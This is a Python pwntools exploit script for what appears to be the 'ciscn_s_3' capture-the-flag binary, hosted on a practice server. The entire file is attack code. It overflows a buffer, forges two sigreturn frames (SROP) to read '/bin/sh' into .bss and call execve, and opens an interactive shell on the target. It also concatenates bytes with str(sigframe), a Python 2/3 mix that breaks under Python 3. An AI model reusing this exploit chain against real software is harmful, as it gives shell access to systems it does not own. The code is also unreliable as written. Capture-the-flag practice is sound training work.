from pwn import *
context(os = 'linux', arch = 'amd64')
#context.log_level = 'debug'
if args["REMOTE"]:
	io = remote('node4.buuoj.cn', 26680)
else:
	io = process("./ciscn_s_3")
elf = ELF("./ciscn_s_3")

bss = elf.bss()
syscall_ret = 0x400517
sigreturn = 0x4004DA

sigframe = SigreturnFrame()
sigframe.rax = 0
sigframe.rdi = 0
sigframe.rsi = bss
sigframe.rdx = 0x200
sigframe.rsp = bss + 8
sigframe.rip = syscall_ret
payload = b'A'*0x10 + p64(sigreturn) + p64(syscall_ret) + str(sigframe)

io.send(payload)

sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = bss
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall_ret

payload = b'/bin/sh\x00' + p64(sigreturn) + p64(syscall_ret) + str(sigframe)
io.send(payload)

io.interactive()